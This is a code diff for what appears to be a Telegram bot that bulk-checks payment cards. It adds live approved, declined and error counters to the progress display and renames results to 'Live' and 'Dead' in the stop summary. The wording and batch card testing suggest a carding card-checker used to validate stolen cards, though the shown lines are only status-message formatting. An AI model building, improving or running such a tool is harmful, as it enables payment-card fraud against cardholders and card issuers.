+# ===== BOT COMMAND HANDLERS (KEEPING YOUR EXACT COMMANDS) =====
 if bot:
     @bot.message_handler(commands=['start', 'help'])
     def send_welcome(message):
@@ -558,8 +641,17 @@ if bot:
                 progress_bar = create_progress_bar(progress, 10)
                 elapsed = format_time(time.time() - check['start_time'])
                 
+                # Get live counters for this check
+                results = results_data.get(check_id, {})
+                approved = results.get('approved', 0)
+                declined = results.get('declined', 0)
+                errors = results.get('error', 0)
+                
                 active_checks.append(
-                    f"*{check_id}*\n`{progress_bar}` {progress}%\n`{check['completed']}/{check['total']}` • `{elapsed}`\n"
+                    f"*{check_id}*\n"
+                    f"`{progress_bar}` {progress}%\n"
+                    f"`{check['completed']}/{check['total']}` • `{elapsed}`\n"
+                    f"✅ `{approved}` ❌ `{declined}` ⚠️ `{errors}`"
                 )
         
         if active_checks:
@@ -647,8 +739,8 @@ if bot:
                         summary = (
                             f"*CHECK STOPPED*\n"
                             f"`{completed}/{total}` cards processed\n\n"
-                            f"✅ `{results['approved']}` Approved\n"
-                            f"❌ `{results['declined']}` Declined\n"
+                            f"✅ `{results['approved']}` Live\n"
+                            f"❌ `{results['declined']}` Dead\n"
                             f"⚠️ `{results['error']}` Errors"
                         )
                         
